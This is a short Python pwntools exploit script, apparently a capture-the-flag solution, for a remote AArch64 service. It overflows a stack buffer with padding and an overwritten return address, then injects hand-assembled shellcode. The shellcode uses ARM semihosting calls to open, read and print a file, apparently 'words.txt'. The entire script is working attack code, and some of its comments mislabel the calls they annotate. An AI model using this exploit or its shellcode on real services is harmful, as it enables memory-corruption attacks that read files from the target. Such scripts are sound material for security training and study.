from pwn import *

context.arch = "aarch64"
context.log_level = "DEBUG"

p = remote("10.2.3.1","10003")

code = [

    #words.txt in stack
    b"\xee\xee\x8d\xd2", # mov  x14, #28535
    b"\x4e\x8e\xac\xf2", # movk x14, #25714, lsl #16
    b"\xce\x85\xce\xf2", # movk x14, #29742, lsl #0x20
    b"\x0e\x8f\xee\xf2", # movk x14, #29816, lsl #0x30
    b"\xef\x03\x1f\xaa", # mov  x15, xzr
    b"\xee\x3f\xbf\xa9", # stp x14, x15, [sp, #-16]!
    b"\x80\xf3\x9f\xd2", # mov  x0, #65436
    b"\xe0\xff\xbf\xf2", # movk x0, #65535, lsl #16
    b"\xe0\xff\xdf\xf2", # movk x0, #65535, lsl #0x20
    b"\xe0\xff\xff\xf2", # movk x0, #65535, lsl #0x30

    b"\xe2\x03\x00\x91", # MOV X2 , SP
    b"\x42\x00\x04\xd1", # SUB X2 , X2 , 0x100

    #open word.txt
    b"\xe0\x03\x00\x91", # MOV X0 , SP
    b"\x40\x00\x00\xf9", # STR X0 , [X2,#0x20 - 0x20]


    b"\xe0\x03\x00\x91", # MOV X0 , SP
    b"\x40\x04\x00\xf9", # STR X0 , [X2,#0x20 - 0x18]

    b"\x00\x00\x80\xd2", # MOV X0 , #0
    b"\x40\x08\x00\xf9", # STR    X0 , [X2,#0x20-0x10]

    b"\xe1\x03\x02\xaa", # MOV             X1, X2 #arg
    b"\x20\x00\x80\xd2", # MOV             X0, #1
    b"\x00\x00\x5e\xd4", # HLT             #0xF000

    b"\xe0\x03\x00\xf9", # STR X0 , [SP]

    #read
    b"\x40\x00\x00\xf9", # STR X0 , [X2,#0x20 - 0x20] #fd

    b"\xe0\x03\x00\x91", # MOV X0 , SP
    b"\x40\x04\x00\xf9", # STR X0 , [X2,#0x20 - 0x18]

    b"\x00\x20\x80\xd2", # MOV X0 , #0x100
    b"\x40\x08\x00\xf9", # STR    X0 , [X2,#0x20-0x10]

    b"\xe1\x03\x02\xaa", # MOV             X1, X2 #arg
    b"\xc0\x00\x80\xd2", # MOV             X0, #6
    b"\x00\x00\x5e\xd4", # HLT             #0xF000

     #open word.txt
    b"\x20\x00\x80\xd2", # MOV X0 , #1
    b"\x40\x00\x00\xf9", # STR X0 , [X2,#0x20 - 0x20]


    b"\xe0\x03\x00\x91", # MOV X0 , SP
    b"\x40\x04\x00\xf9", # STR X0 , [X2,#0x20 - 0x18]

    b"\x00\x20\x80\xd2", # MOV X0 , #0x100
    b"\x40\x08\x00\xf9", # STR    X0 , [X2,#0x20-0x10]

    b"\xe1\x03\x02\xaa", # MOV             X1, X2

    b"\xa0\x00\x80\xd2", # MOV             X0, #5 #arg
    b"\x00\x00\x5e\xd4", # HLT             #0xF000

]

raw = b"".join(code)


print hex(len(raw))

pay = "A" * 0x10
pay += p64(0x000000000001b08)
pay += raw

p.sendlineafter(":",pay)

p.interactive()
